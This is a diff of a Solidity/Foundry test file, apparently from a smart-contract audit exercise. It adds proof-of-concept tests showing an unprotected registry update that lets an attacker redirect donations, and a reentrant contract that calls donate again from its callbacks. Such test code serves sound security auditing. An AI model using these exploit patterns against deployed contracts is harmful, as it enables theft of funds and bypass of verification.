@@ -154,42 +154,65 @@ contract GivingThanksTest is Test {
         address attacker = makeAddr("attacker");  
 
         // Change the registry address to the attacker's address  
-        vm.prank(address(maliciousRegistry));
+        vm.prank(attacker);
         charityContract.updateRegistry(address(maliciousRegistry));
 
         // Now, the donate function will accept any address as a verified charity
-        // Register a charity on the original registry, then send to that charity even though it is not verified.
-        vm.prank(charity);
-        registryContract.registerCharity(charity);
+        // We will create a random charity that is not even registered and donate to it.
+        address newCharity = makeAddr("newCharity");
 
         // Fund the donor
         vm.deal(donor, 10 ether);
 
         // Donor donates to the charity, It goes through even though the charity is not verified
         vm.prank(donor);
-        charityContract.donate{value: 1 ether}(charity);
+        charityContract.donate{value: 10 ether}(newCharity);
+
+        // Verify that the donation was sent to the newCharity
+        uint256 charityBalance = newCharity.balance;
+        assertEq(charityBalance, 10 ether);
+    }
+
+
+    function testReentrancyInDonate() public {
+        // Deploy the reentrant contract
+        ReentrantContract reentrantContract = new ReentrantContract(charityContract);
+
+        // Fund the donor
+        vm.deal(address(reentrantContract), 20 ether);
+
+        // Donor donates to the charity
+        vm.startPrank(address(reentrantContract));
+        charityContract.donate{value: 1 ether}(address(charity));
 
         // Verify that the donation was sent to the charity
         uint256 charityBalance = charity.balance;
         assertEq(charityBalance, 1 ether);
     }
+}
+
+contract ReentrantContract is IERC721Receiver, Test {
+    GivingThanks charityContract;
+    uint256 counter = 0;
+    address charity = makeAddr("charity");
 
 
-    // function testReentrancyInDonate() public {
-    //     // Deploy the malicious contract
-    //     MaliciousCharity maliciousCharity = new MaliciousCharity(address(charityContract));
+    constructor(GivingThanks _charityContract) {
+        charityContract = _charityContract;
+    }
+    receive() external payable {
+        // Reenter the donate function
+        charityContract.donate{value: 1 ether}(charity);
+    }
 
-    //     // Fund the donor
-    //     vm.deal(donor, 10 ether);
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
+        if(counter < 10){
+            counter++;
+            charityContract.donate{value: 1 ether}(charity);            
+        }
 
-    //     // Donor donates to the charity
-    //     vm.prank(donor);
-    //     charityContract.donate{value: 1 ether}(address(maliciousCharity));
-
-    //     // Verify that the donation was sent to the charity
-    //     uint256 charityBalance = charity.balance;
-    //     assertEq(charityBalance, 10 ether);
-    // }
+        return this.onERC721Received.selector;
+    }
 }
 
 
